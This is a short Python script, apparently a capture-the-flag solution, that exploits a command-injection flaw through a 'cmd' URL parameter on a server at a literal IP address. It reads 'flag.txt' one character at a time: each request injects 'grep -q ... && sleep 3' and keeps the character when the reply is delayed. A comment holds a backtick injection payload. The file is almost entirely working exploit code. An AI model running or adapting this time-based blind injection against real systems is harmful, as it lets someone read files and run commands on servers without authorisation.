import requests
import time
a="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{}~_"
url = "http://103.97.125.53:31798"
c=""
while True:
    for i in a:
        start_time=time.time()
        r=requests.head(url + "/?cmd=grep -q 'CHH"+c+i+"' flag.txt && sleep 3")
        end_time=time.time()
        currenTime=end_time-start_time
        if currenTime>2:
            c+=i
            print(c)
# payload=";`grep -q "L" flag.txt && sleep 3`;"